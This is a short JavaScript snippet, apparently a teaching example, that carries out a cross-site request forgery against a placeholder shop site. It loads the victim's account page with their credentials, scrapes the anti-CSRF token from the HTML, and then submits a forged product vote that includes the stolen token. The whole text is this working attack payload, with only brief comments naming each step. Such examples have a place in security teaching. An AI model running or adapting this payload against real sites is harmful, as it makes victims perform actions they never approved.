// retrieve page content
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.example.com/shop/viewAccount", false);
xhr.withCredentials=true;
xhr.send(null);

// extract CSRF token from page content
var token = xhr.responseText;
var pos = token.indexOf("csrftoken");
token = token.substring(pos,token.length).substr(12,50);

// now execute the CSRF attack using XHR along with the extracted token
xhr.open("POST", "https://www.example.com/shop/voteForProduct", false);
xhr.withCredentials=true;
var params = "productId=4711&vote=AAA&csrftoken="+token;
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Content-length", params.length);
xhr.send(params);